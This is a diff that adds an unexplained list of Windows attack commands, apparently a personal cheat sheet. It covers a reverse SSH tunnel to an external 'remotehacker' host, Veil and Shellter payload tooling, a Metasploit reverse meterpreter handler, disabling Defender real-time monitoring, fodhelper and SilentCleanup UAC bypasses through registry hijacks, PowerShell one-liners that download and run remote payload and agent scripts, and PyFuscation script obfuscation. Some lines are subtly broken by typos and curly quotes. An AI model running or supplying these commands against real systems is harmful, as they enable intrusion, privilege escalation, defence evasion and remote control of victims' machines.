@@ -1,0 +1,37 @@
+netsh advfirewall firewall set rule group=”remote desktop” new enable=Yes
+ssh -R 2210:localhost:443 -p 443 remotehacker@ExternalIPtoTunnel
+ssh -p 2210 localhost
+sudo apt install veil 
+/usr/share/veil/config/setup. sh --force --silent
+ 
+sudo apt-get install shellter
+#Metasploit handler
+      use exploit/multi/handler
+      set payload windows/meterpreterreverse_HTTPS
+      set lhost <YOUR KALI IP>
+      set lport 443
+      set exitonsession false
+      exploit -j -z
+      
+ whoami /groups
+ 
+ PowerShell.exe Set-MpPreference –DisableRealtimeMonitoring $true
+ 
+WmiObject Win32_UserAccount -filter “LocalAccount=True”| Select-Object Name,Fullname,Disabled 
+New-Item -Path HKCU:\Software\classes\ms-settings\shell\open\command-value cmd.exe –Force
+New-ItemProperty -Path HKCU:\Software\classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force 
+fodhelper
+
+Powershell -exec bypass -c “(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr(‘http://webserver/payload.ps1’) FodhelperBypass -program ‘cmd.exe /c Powershell -exec bypass -c “(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr(‘http://webserver/agent.ps1’)”
+
+reg add hkcu\Environment /v windir /d “cmd /K reg delete hkcu\Environment/v windir /f && REM”
+schtasks /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I
+
+
+sudo git clone https://github.com/CBHue/PyFuscation
+cd PyFuscation
+sudo python3 PyFuscation.py
+
+sudo python3 PyFuscation.py –fvp –-ps nameofthescript.ps1
+
+
